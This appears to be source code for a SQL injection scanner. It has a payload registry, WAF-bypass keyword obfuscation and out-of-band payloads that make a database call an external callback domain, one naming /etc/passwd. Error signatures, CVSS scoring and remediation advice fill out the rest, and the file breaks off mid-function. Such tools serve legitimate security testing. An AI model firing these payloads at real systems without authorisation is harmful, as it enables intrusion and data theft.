import type { ScanProfile, SQLiFinding, ConfidenceLevel, EnumerationResult, TechStackInfo } from "@/lib/types";

// ─── WAF Bypass Techniques ───

export enum BypassTechnique {
    NONE = "NONE",
    CASE_VARIATION = "CASE_VARIATION",
    COMMENT_INJECTION = "COMMENT_INJECTION",
    URL_ENCODING = "URL_ENCODING",
    DOUBLE_URL_ENCODING = "DOUBLE_URL_ENCODING",
    EQUIVALENT_REPLACEMENT = "EQUIVALENT_REPLACEMENT",
    TAB_SEPARATOR = "TAB_SEPARATOR",
    FUNCTION_CALL_OBFUSCATION = "FUNCTION_CALL_OBFUSCATION",
}

// ─── Payload Types ───

type PayloadCategory =
    | "syntax_probe" | "error_based" | "boolean_based_true" | "boolean_based_false"
    | "time_based" | "union_probe" | "stacked_query" | "oob_dns" | "oob_http"
    | "second_order_marker" | "header_injection";

interface Payload {
    value: string;
    category: PayloadCategory;
    description: string;
    dbTypes: string[];
    requiresOobDomain: boolean;
    baseComplexity: number;
    bypassTechnique?: BypassTechnique;
    /** For boolean pairs — value of the paired true/false counterpart */
    booleanPair?: string;
}

// ─── Error Signatures (tightened to reduce false positives) ───

interface ErrorSignature {
    pattern: string;
    weight: number;  // 1=weak, 2=moderate, 3=strong
    dbType: string;
}

const SQL_ERROR_SIGNATURES: ErrorSignature[] = [
    // MySQL — strong, specific
    { pattern: "you have an error in your sql syntax", weight: 3, dbType: "mysql" },
    { pattern: "mysql_fetch_array()", weight: 3, dbType: "mysql" },
    { pattern: "mysql_fetch_assoc()", weight: 3, dbType: "mysql" },
    { pattern: "mysql_fetch_object()", weight: 3, dbType: "mysql" },
    { pattern: "mysql_fetch_row()", weight: 3, dbType: "mysql" },
    { pattern: "mysql_num_rows()", weight: 3, dbType: "mysql" },
    { pattern: "supplied argument is not a valid mysql", weight: 3, dbType: "mysql" },
    { pattern: "mysql server version for the right syntax", weight: 3, dbType: "mysql" },
    { pattern: "warning: mysql_", weight: 3, dbType: "mysql" },
    { pattern: "extractvalue(", weight: 3, dbType: "mysql" },
    { pattern: "updatexml(", weight: 3, dbType: "mysql" },
    { pattern: "subquery returns more than 1 row", weight: 3, dbType: "mysql" },
    { pattern: "duplicate entry '", weight: 2, dbType: "mysql" },
    { pattern: "unknown column '", weight: 2, dbType: "mysql" },
    { pattern: "xpatherror:", weight: 3, dbType: "mysql" },
    { pattern: "group function is invalid", weight: 2, dbType: "mysql" },
    { pattern: "mysql error", weight: 2, dbType: "mysql" },

    // MSSQL — strong, specific
    { pattern: "unclosed quotation mark after the character string", weight: 3, dbType: "mssql" },
    { pattern: "incorrect syntax near '", weight: 3, dbType: "mssql" },
    { pattern: "microsoft ole db provider for sql server", weight: 3, dbType: "mssql" },
    { pattern: "microsoft sql server", weight: 3, dbType: "mssql" },
    { pattern: "odbc sql server driver", weight: 3, dbType: "mssql" },
    { pattern: "warning: mssql_", weight: 3, dbType: "mssql" },
    { pattern: "conversion failed when converting", weight: 2, dbType: "mssql" },
    { pattern: "string or binary data would be truncated", weight: 2, dbType: "mssql" },
    { pattern: "invalid column name '", weight: 2, dbType: "mssql" },
    { pattern: "subquery returned more than 1 value", weight: 3, dbType: "mssql" },
    { pattern: "violation of primary key constraint", weight: 2, dbType: "mssql" },
    { pattern: "[microsoft][odbc", weight: 3, dbType: "mssql" },

    // Oracle — strong, specific
    { pattern: "ora-01756:", weight: 3, dbType: "oracle" },
    { pattern: "ora-00933:", weight: 3, dbType: "oracle" },
    { pattern: "ora-00907:", weight: 3, dbType: "oracle" },
    { pattern: "ora-01742:", weight: 3, dbType: "oracle" },
    { pattern: "ora-00904:", weight: 3, dbType: "oracle" },
    { pattern: "ora-00936:", weight: 3, dbType: "oracle" },
    { pattern: "ora-", weight: 2, dbType: "oracle" },
    { pattern: "pls-", weight: 2, dbType: "oracle" },
    { pattern: "oracle database error", weight: 3, dbType: "oracle" },
    { pattern: "oci_execute():", weight: 3, dbType: "oracle" },
    { pattern: "oci_fetch()", weight: 3, dbType: "oracle" },
    { pattern: "warning: oci_", weight: 3, dbType: "oracle" },

    // PostgreSQL — strong, specific
    { pattern: "pg_query():", weight: 3, dbType: "postgresql" },
    { pattern: "pg_exec():", weight: 3, dbType: "postgresql" },
    { pattern: "warning: pg_", weight: 3, dbType: "postgresql" },
    { pattern: "invalid input syntax for type", weight: 2, dbType: "postgresql" },
    { pattern: "current transaction is aborted, commands ignored", weight: 3, dbType: "postgresql" },
    { pattern: "operator does not exist:", weight: 2, dbType: "postgresql" },
    { pattern: "more than one row returned by a subquery", weight: 3, dbType: "postgresql" },
    { pattern: "division by zero", weight: 2, dbType: "postgresql" },
    { pattern: "unterminated quoted string at or near", weight: 3, dbType: "postgresql" },
    { pattern: "syntax error at or near", weight: 2, dbType: "postgresql" },

    // SQLite — strong, specific
    { pattern: "sqlite_query():", weight: 3, dbType: "sqlite" },
    { pattern: "warning: sqlite_", weight: 3, dbType: "sqlite" },
    { pattern: "sqlite3::query", weight: 3, dbType: "sqlite" },
    { pattern: "unrecognized token:", weight: 2, dbType: "sqlite" },
    { pattern: "no such table:", weight: 2, dbType: "sqlite" },
    { pattern: "no such column:", weight: 2, dbType: "sqlite" },
    { pattern: "sql logic error or missing database", weight: 3, dbType: "sqlite" },
    { pattern: "constraint failed", weight: 2, dbType: "sqlite" },

    // Generic SQL — moderate weight only
    { pattern: "sql syntax error", weight: 2, dbType: "generic" },
    { pattern: "quoted string not properly terminated", weight: 3, dbType: "generic" },
    { pattern: "unexpected end of sql command", weight: 3, dbType: "generic" },
    { pattern: "sql command not properly ended", weight: 3, dbType: "generic" },
    { pattern: "odbc_exec()", weight: 2, dbType: "generic" },
    { pattern: "jdbc", weight: 1, dbType: "generic" },
    { pattern: "db2 sql error:", weight: 3, dbType: "db2" },
];

function checkErrorSignatures(body: string): {
    found: boolean;
    signatures: string[];
    dbHint: string;
    totalWeight: number;
} {
    const foundSigs: string[] = [];
    let dbHint = "unknown";
    let totalWeight = 0;
    let bestDbWeight: Record<string, number> = {};
    const lower = body.toLowerCase();

    for (const sig of SQL_ERROR_SIGNATURES) {
        if (lower.includes(sig.pattern.toLowerCase())) {
            foundSigs.push(sig.pattern);
            totalWeight += sig.weight;
            bestDbWeight[sig.dbType] = (bestDbWeight[sig.dbType] || 0) + sig.weight;
        }
    }

    // Determine DB hint from highest-weighted DB type
    let maxWeight = 0;
    for (const [db, w] of Object.entries(bestDbWeight)) {
        if (db !== "generic" && w > maxWeight) {
            maxWeight = w;
            dbHint = db;
        }
    }

    // Require minimum total signature weight >= 2 to prevent single-word false positives
    const found = totalWeight >= 2;

    return { found, signatures: foundSigs, dbHint, totalWeight };
}

// ─── Payload Registry ───

const BASE_PAYLOADS: Payload[] = [
    // ── Syntax probes (detect basic injection points)
    { value: "'", category: "syntax_probe", description: "Single quote", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "\"", category: "syntax_probe", description: "Double quote", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "\\", category: "syntax_probe", description: "Backslash (MySQL escape)", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "1' ORDER BY 1-- -", category: "syntax_probe", description: "ORDER BY 1", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "1' ORDER BY 100-- -", category: "syntax_probe", description: "ORDER BY 100 (column error)", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "1 ORDER BY 1-- -", category: "syntax_probe", description: "Numeric ORDER BY 1", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },

    // ── Error-based (trigger verbose DB errors)
    { value: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))-- -", category: "error_based", description: "MySQL ExtractValue version", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1)-- -", category: "error_based", description: "MySQL UpdateXML database", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))-- -", category: "error_based", description: "MySQL ExtractValue table names", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 4 },
    { value: "1' AND 1=CONVERT(INT, (SELECT @@VERSION))-- -", category: "error_based", description: "MSSQL CONVERT version", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "1' AND 1=CONVERT(INT, (SELECT DB_NAME()))-- -", category: "error_based", description: "MSSQL CONVERT dbname", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' OR CAST((SELECT version()) AS NUMERIC)-- -", category: "error_based", description: "PostgreSQL CAST version", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' OR 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)-- -", category: "error_based", description: "PostgreSQL CAST table", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 4 },
    { value: "' AND 1=1 AND '1'=UTL_HTTP.REQUEST('http://127.0.0.1/')-- -", category: "error_based", description: "Oracle UTL_HTTP (error trigger)", dbTypes: ["oracle"], requiresOobDomain: false, baseComplexity: 4 },

    // ── Boolean-based (TRUE/FALSE pairs — must match by index)
    { value: "' AND 1=1-- -", category: "boolean_based_true", description: "Boolean TRUE", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1, booleanPair: "' AND 1=2-- -" },
    { value: "' AND 1=2-- -", category: "boolean_based_false", description: "Boolean FALSE", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1, booleanPair: "' AND 1=1-- -" },
    { value: "' AND 'a'='a'-- -", category: "boolean_based_true", description: "String TRUE", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1, booleanPair: "' AND 'a'='b'-- -" },
    { value: "' AND 'a'='b'-- -", category: "boolean_based_false", description: "String FALSE", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1, booleanPair: "' AND 'a'='a'-- -" },
    { value: "1 AND 1=1-- -", category: "boolean_based_true", description: "Numeric TRUE (no quote)", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1, booleanPair: "1 AND 1=2-- -" },
    { value: "1 AND 1=2-- -", category: "boolean_based_false", description: "Numeric FALSE (no quote)", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1, booleanPair: "1 AND 1=1-- -" },
    { value: "' OR '1'='1'-- -", category: "boolean_based_true", description: "OR TRUE", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1, booleanPair: "' OR '1'='2'-- -" },
    { value: "' OR '1'='2'-- -", category: "boolean_based_false", description: "OR FALSE", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1, booleanPair: "' OR '1'='1'-- -" },
    // MySQL-specific boolean
    { value: "' AND SUBSTRING(VERSION(),1,1)='5'-- -", category: "boolean_based_true", description: "MySQL version probe TRUE", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 2, booleanPair: "' AND SUBSTRING(VERSION(),1,1)='9'-- -" },
    { value: "' AND SUBSTRING(VERSION(),1,1)='9'-- -", category: "boolean_based_false", description: "MySQL version probe FALSE", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 2, booleanPair: "' AND SUBSTRING(VERSION(),1,1)='5'-- -" },

    // ── Time-based (trigger measurable delays)
    { value: "' OR SLEEP(5)-- -", category: "time_based", description: "MySQL SLEEP 5s", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' AND SLEEP(5)-- -", category: "time_based", description: "MySQL AND SLEEP 5s", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "1'; SELECT SLEEP(5)-- -", category: "time_based", description: "MySQL stacked SLEEP 5s", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' OR (SELECT SLEEP(5))-- -", category: "time_based", description: "MySQL subquery SLEEP", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1' AND BENCHMARK(5000000,SHA1('test'))-- -", category: "time_based", description: "MySQL BENCHMARK delay", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "'; WAITFOR DELAY '0:0:5'-- -", category: "time_based", description: "MSSQL WAITFOR 5s", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' OR WAITFOR DELAY '0:0:5'-- -", category: "time_based", description: "MSSQL OR WAITFOR 5s", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1'; IF (1=1) WAITFOR DELAY '0:0:5'-- -", category: "time_based", description: "MSSQL conditional delay", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' OR pg_sleep(5)-- -", category: "time_based", description: "PostgreSQL pg_sleep", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "1' OR (SELECT pg_sleep(5))-- -", category: "time_based", description: "PostgreSQL subquery sleep", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' OR 1=1 AND SLEEP(5)-- -", category: "time_based", description: "MySQL combined OR SLEEP", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 2 },

    // ── UNION probes (test for UNION-injectable parameters)
    { value: "' UNION SELECT NULL-- -", category: "union_probe", description: "UNION 1 col", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL-- -", category: "union_probe", description: "UNION 2 cols", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL,NULL-- -", category: "union_probe", description: "UNION 3 cols", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL,NULL,NULL-- -", category: "union_probe", description: "UNION 4 cols", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", category: "union_probe", description: "UNION 5 cols", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -", category: "union_probe", description: "UNION 6 cols", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1 UNION SELECT NULL-- -", category: "union_probe", description: "Numeric UNION 1 col", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1 UNION SELECT NULL,NULL-- -", category: "union_probe", description: "Numeric UNION 2 cols", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1 UNION SELECT NULL,NULL,NULL-- -", category: "union_probe", description: "Numeric UNION 3 cols", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    // UNION with version/banner extraction (confirms data exfiltration)
    { value: "' UNION SELECT @@version,NULL,NULL-- -", category: "union_probe", description: "UNION version (MySQL/MSSQL)", dbTypes: ["mysql", "mssql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' UNION SELECT version(),NULL,NULL-- -", category: "union_probe", description: "UNION version() (PostgreSQL)", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 3 },

    // ── Stacked queries
    { value: "'; SELECT SLEEP(3)-- -", category: "stacked_query", description: "MySQL stacked SLEEP 3s", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "'; WAITFOR DELAY '0:0:3'-- -", category: "stacked_query", description: "MSSQL stacked WAITFOR 3s", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "'; SELECT pg_sleep(3)-- -", category: "stacked_query", description: "PostgreSQL stacked sleep", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 3 },
];

// ─── OOB Payload Generator ───

function buildOobPayloads(oobDomain: string): Payload[] {
    if (!oobDomain) return [];
    const d = oobDomain.replace(/^https?:\/\//, "").trim();
    return [
        { value: `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',DATABASE(),'.',${sqlStr(d)},'\\\\test'))-- -`, category: "oob_dns", description: "MySQL DNS OOB via LOAD_FILE", dbTypes: ["mysql"], requiresOobDomain: true, baseComplexity: 5 },
        { value: `'; EXEC master..xp_dirtree '//${d}/${randomHex(8)}'-- -`, category: "oob_dns", description: "MSSQL DNS OOB via xp_dirtree", dbTypes: ["mssql"], requiresOobDomain: true, baseComplexity: 5 },
        { value: `' UNION SELECT UTL_HTTP.REQUEST('http://${d}/${randomHex(8)}') FROM dual-- -`, category: "oob_http", description: "Oracle HTTP OOB via UTL_HTTP", dbTypes: ["oracle"], requiresOobDomain: true, baseComplexity: 5 },
        { value: `' OR 1=COPY_FILE('/etc/passwd','\\\\${d}\\share')-- -`, category: "oob_dns", description: "PostgreSQL COPY OOB", dbTypes: ["postgresql"], requiresOobDomain: true, baseComplexity: 5 },
    ];
}

function sqlStr(s: string): string {
    return `'${s.replace(/'/g, "''")}'`;
}

function randomHex(n: number): string {
    return Math.random().toString(16).substring(2, 2 + n);
}

// ─── Header Injection Payloads ───

const HEADER_INJECTION_PAYLOADS: Payload[] = [
    { value: "' OR SLEEP(5)-- -", category: "header_injection", description: "Header time-based (MySQL)", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "'; WAITFOR DELAY '0:0:5'-- -", category: "header_injection", description: "Header time-based (MSSQL)", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' OR pg_sleep(5)-- -", category: "header_injection", description: "Header time-based (PostgreSQL)", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))-- -", category: "header_injection", description: "Header error-based (MySQL)", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' AND 1=1-- -", category: "header_injection", description: "Header boolean TRUE", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "'", category: "header_injection", description: "Header syntax probe", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
];

const INJECTABLE_HEADERS = [
    "X-Forwarded-For",
    "User-Agent",
    "Referer",
    "X-Real-IP",
    "X-Original-URL",
    "X-Host",
    "X-Forwarded-Host",
];

// ─── Polymorphic WAF Bypass Engine ───

function generatePolymorphicVariants(p: Payload, limitVariants: boolean = false): Array<{ payload: Payload; bypass: BypassTechnique }> {
    const variants: Array<{ payload: Payload; bypass: BypassTechnique }> = [
        { payload: { ...p, bypassTechnique: BypassTechnique.NONE }, bypass: BypassTechnique.NONE },
    ];

    if (limitVariants) return variants;

    if (p.category === "error_based" || p.category === "union_probe") {
        // EQUIVALENT_REPLACEMENT
        const val1 = p.value
            .replace(/\bSELECT\b/gi, "sE/*!99999*/LECT")
            .replace(/\bEXTRACTVALUE\b/gi, "ExTRacTVALUE")
            .replace(/\bCONCAT\b/gi, "CONcAT")
            .replace(/\bVERSION\b/gi, "VERsION");
        if (val1 !== p.value) {
            variants.push({ payload: { ...p, value: val1, bypassTechnique: BypassTechnique.EQUIVALENT_REPLACEMENT }, bypass: BypassTechnique.EQUIVALENT_REPLACEMENT });
        }

        // TAB_SEPARATOR (inline comment injection)
        const val2 = p.value
            .replace(/\bAND\b/gi, "A/**/ND")
            .replace(/\bUNION\b/gi, "Uni/*!*/on")
            .replace(/\bSELECT\b/gi, "SEL/**/ECT");
        if (val2 !== p.value) {
            variants.push({ payload: { ...p, value: val2, bypassTechnique: BypassTechnique.TAB_SEPARATOR }, bypass: BypassTechnique.TAB_SEPARATOR });
        }
    }

    return variants;
}

// ─── CVSS v3.1 Scoring (properly decoupled from confidence) ───

/**
 * Maps detection method to CVSS v3.1 base score.
 * Scores are based on:
 * - Attack Vector: Network (AV:N)
 * - Attack Complexity: Low (AC:L)
 * - Privileges Required: None (PR:N)
 * - User Interaction: None (UI:N)
 * - Scope: Unchanged (S:U)
 * - Impact varies by method capability
 */
const CVSS_BASE_SCORES: Record<string, number> = {
    OOB_DNS: 9.8,        // Full data exfil capability; Critical
    OOB_HTTP: 9.8,       // Full data exfil capability; Critical
    UNION_PROBE: 9.1,    // Confirmed data extraction; Critical
    STACKED_QUERY: 9.0,  // Arbitrary query execution; Critical
    ERROR_BASED: 8.5,    // Reveals DB structure/data; High
    TIME_BASED_STATISTICAL: 8.0,  // Confirmed blind; High
    BOOLEAN_BASED: 7.5,  // Confirmed blind; High
    CONTENT_DIFF: 4.5,   // Weak signal only; Medium
    STATUS_CODE_ANOMALY: 3.0,     // Very weak signal; Low
};

function calculateSeverity(cvssScore: number): string {
    if (cvssScore >= 9.0) return "Critical";
    if (cvssScore >= 7.0) return "High";
    if (cvssScore >= 4.0) return "Medium";
    if (cvssScore >= 0.1) return "Low";
    return "Info";
}

function getConfidenceLevel(confidence: number): ConfidenceLevel {
    if (confidence >= 0.75) return "High";
    if (confidence >= 0.50) return "Medium";
    if (confidence >= 0.25) return "Low";
    return "Tentative";
}

function scoreConfidence(opts: {
    hasErrors: boolean;
    errorWeight: number;
    timeDelay: boolean;
    timingZScore: number;
    oobId: string;
    booleanConfirmed: boolean;
    contentDiff: number;
    testStatus: number;
    baselineStatus: number;
    signatures: string[];
    dbHint: string;
}): number {
    let score = 0.0;

    // Error-based: weight by signature strength
    if (opts.hasErrors) {
        if (opts.errorWeight >= 6) score += 0.90;       // multiple strong signatures
        else if (opts.errorWeight >= 3) score += 0.70;  // at least one strong sig
        else score += 0.45;                              // weak/single sig
    }

    // Time-based: Z-score based (statistically validated)
    if (opts.timeDelay) {
        if (opts.timingZScore >= 5.0) score += 0.90;
        else if (opts.timingZScore >= 3.0) score += 0.75;
        else score += 0.50; // below Z=3 threshold, tentative only
    }

    // OOB: highest confidence possible
    if (opts.oobId) score += 1.0;

    // Boolean: requires TRUE ≠ FALSE confirmation
    if (opts.booleanConfirmed) score += 0.75;

    // Content diff: weak signal, only additive
    if (opts.contentDiff > 80) score += 0.15;
    else if (opts.contentDiff > 40) score += 0.08;
    else if (opts.contentDiff > 15) score += 0.03;

    // Status code anomaly: very weak signal
    if (opts.testStatus >= 500 && opts.baselineStatus === 200) score += 0.20;
    else if (opts.testStatus >= 400 && opts.baselineStatus === 200) score += 0.10;

    // DB hint confirmation bonus (error-based only)
    if (opts.dbHint !== "unknown" && opts.hasErrors) score += 0.10;

    // Multiple distinct signatures bonus
    if (opts.signatures.length >= 5) score += 0.10;
    else if (opts.signatures.length >= 3) score += 0.05;

    return Math.min(score, 1.0);
}

// ─── Classification & Reporting ───

const CWE_MAP: Record<string, string> = {
    ERROR_BASED: "CWE-89",
    BOOLEAN_BASED: "CWE-89",
    TIME_BASED_STATISTICAL: "CWE-89",
    UNION_PROBE: "CWE-89",
    STACKED_QUERY: "CWE-89",
    OOB_DNS: "CWE-89",
    OOB_HTTP: "CWE-89",
    STATUS_CODE_ANOMALY: "CWE-89",
    CONTENT_DIFF: "CWE-89",
};

const OWASP_CATEGORY = "A03:2021 – Injection";

const REFERENCES = [
    "https://owasp.org/www-community/attacks/SQL_Injection",
    "https://cwe.mitre.org/data/definitions/89.html",
    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
    "https://portswigger.net/web-security/sql-injection",
];

function generateExplanation(finding: Partial<SQLiFinding>): string {
    const det = finding.detectionMethod || "";
    const payload = (finding.payloadUsed || "").slice(0, 100);
    const param = finding.parameter || "parameter";
    const db = (finding.dbTypeHint && finding.dbTypeHint !== "unknown" ? finding.dbTypeHint : "the backend database").toUpperCase();
    const url = finding.url || "";

    if (det === "ERROR_BASED") {
        const sigs = (finding.errorSignatures || []).slice(0, 3).join(", ");
        return `Error-Based SQL Injection confirmed on parameter '${param}' at ${url}. ` +
            `The payload '${payload}' caused the application to emit raw database error messages, ` +
            `revealing that the input is being concatenated directly into a SQL query without sanitization. ` +
            `Database backend identified as ${db}. ` +
            `Error signatures matched: ${sigs || "SQL syntax error patterns"}. ` +
            `This technique allows an attacker to infer the database schema, extract data, ` +
            `and potentially escalate to OS-level access if the DB account has FILE privileges.`;
    }

    if (det === "BOOLEAN_BASED") {
        const diff = finding.responseDifferencePercent?.toFixed(1) || "?";
        return `Boolean-Based Blind SQL Injection confirmed on parameter '${param}' at ${url}. ` +
            `The application returned measurably different responses (${diff}% content difference) ` +
            `for logically TRUE vs FALSE SQL conditions injected via '${payload}'. ` +
            `This confirms the parameter is injectable. An attacker can exploit this to extract ` +
            `the entire database contents character by character, though it requires many requests.`;
    }

    if (det === "TIME_BASED_STATISTICAL") {
        const delay = finding.timeDelaySeconds?.toFixed(2) || "?";
        const z = finding.timingZScore?.toFixed(1) || "?";
        return `Time-Based Blind SQL Injection (statistically validated) on parameter '${param}' at ${url}. ` +
            `The payload '${payload}' caused a ${delay}s response delay (Z-score: ${z}) relative to baseline. ` +
            `This confirms the parameter is injectable even without visible error output or content changes. ` +
            `An attacker can extract data by encoding it as timing differences (e.g., sleep if char='a').`;
    }

    if (det === "UNION_PROBE") {
        return `UNION-Based SQL Injection detected on parameter '${param}' at ${url}. ` +
            `The payload '${payload}' was accepted by the application, indicating the query is UNION-injectable. ` +
            `This is the most impactful form of SQLi as it enables direct data extraction in a single request. ` +
            `An attacker can enumerate all tables, extract credentials, read server files (MySQL FILE privilege), ` +
            `or write webshells (MySQL INTO OUTFILE).`;
    }

    if (det === "STACKED_QUERY") {
        return `Stacked Query SQL Injection confirmed on parameter '${param}' at ${url}. ` +
            `The payload '${payload}' successfully injected additional SQL statements after a semicolon. ` +
            `This is the most dangerous form — it allows arbitrary DML/DDL execution including ` +
            `INSERT, UPDATE, DELETE, DROP, or invoking stored procedures like xp_cmdshell (MSSQL).`;
    }

    if (det === "OOB_DNS" || det === "OOB_HTTP") {
        return `Out-of-Band (OOB) SQL Injection payload injected on parameter '${param}' at ${url}. ` +
            `The payload '${payload}' attempts to exfiltrate data via DNS/HTTP callback to an external server. ` +
            `Requires callback verification to confirm exploitation. This technique bypasses WAFs that monitor response content.`;
    }

    return `SQL Injection indicator detected on parameter '${param}' at ${url} ` +
        `using payload '${payload}'. Manual verification recommended.`;
}

function generateRemediation(detectionMethod: string, dbHint: string): string[] {
    const base = [
        "1. PRIMARY FIX — Parameterized Queries/Prepared Statements: Replace all dynamic SQL concatenation with parameterized queries or ORMs that handle escaping (e.g., PDO/MySQLi in PHP, Hibernate in Java, SQLAlchemy in Python).",
        "2. INPUT VALIDATION: Implement strict server-side allowlist validation. For numeric IDs, verify input is an integer before using it.",
        "3. LEAST PRIVILEGE: Ensure the database account used by the application has only SELECT/INSERT/UPDATE permissions on required tables. Remove FILE, EXEC, and admin privileges.",
        "4. ERROR HANDLING: Configure the application and database to never return raw error messages to the browser. Use generic error pages in production.",
        "5. WAF: Deploy a Web Application Firewall (e.g., ModSecurity with OWASP CRS, AWS WAF, Cloudflare) as a defense-in-depth layer.",
    ];

    const dbSpecific: Record<string, string> = {
        mysql: "6. MySQL SPECIFIC: Disable FILE privilege for the app user: REVOKE FILE ON *.* FROM 'appuser'@'%'. Consider enabling query logging to detect injection attempts.",
        mssql: "6. MSSQL SPECIFIC: Disable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE. Use Windows Authentication instead of SQL auth where possible.",
        postgresql: "7. PostgreSQL SPECIFIC: Use row-level security (RLS) to limit data exposure per user. Disable COPY TO/FROM for the app role.",
        oracle: "7. Oracle SPECIFIC: Restrict UTL_HTTP, UTL_FILE, and DBMS_PIPE package grants. Audit with Oracle Auditing Vault.",
    };

    if (dbHint && dbHint !== "unknown" && dbSpecific[dbHint]) {
        base.push(dbSpecific[dbHint]);
    }

    if (detectionMethod === "UNION_PROBE") {
        base.push("UNION-SPECIFIC: Ensure SELECT queries only return the minimum required columns. Consider using views that restrict data exposure.");
    }

    if (detectionMethod === "TIME_BASED_STATISTICAL") {
        base.push("BLIND SQLi NOTE: Even without visible output, blind injection is fully exploitable. Do not rely on hiding error messages as a security control.");
    }

    return base;
}

function buildPocRequest(method: string, url: string, param: string, payload: string, headers: Record<string, string>, isForm: boolean, formData?: Record<string, string>): string {
    const parsedUrl = new URL(url);
    let poc = "";

    if (method === "GET" && !isForm) {
        parsedUrl.searchParams.set(param, payload);
        poc = `GET ${parsedUrl.pathname}${parsedUrl.search} HTTP/1.1\r\n`;
        poc += `Host: ${parsedUrl.host}\r\n`;
        poc += `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n`;
        if (headers["Cookie"]) poc += `Cookie: ${headers["Cookie"]}\r\n`;
        poc += `Connection: close\r\n`;
    } else if (method === "POST" || isForm) {
        const data = { ...(formData || {}), [param]: payload };
        const body = new URLSearchParams(data).toString();
        poc = `POST ${parsedUrl.pathname} HTTP/1.1\r\n`;
        poc += `Host: ${parsedUrl.host}\r\n`;
        poc += `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n`;
        poc += `Content-Type: application/x-www-form-urlencoded\r\n`;
        poc += `Content-Length: ${body.length}\r\n`;
        if (headers["Cookie"]) poc += `Cookie: ${headers["Cookie"]}\r\n`;
        poc += `Connection: close\r\n\r\n`;
        poc += body;
    }

    return poc;
}

// ─── Deduplication ───

function deduplicateFindings(findings: SQLiFinding[]): SQLiFinding[] {
    // Group by (url, parameter, detectionMethod) — keep highest confidence
    const methodGroups = new Map<string, SQLiFinding>();
    for (const f of findings) {
        const key = `${f.url}|${f.parameter}|${f.detectionMethod}`;
        const existing = methodGroups.get(key);
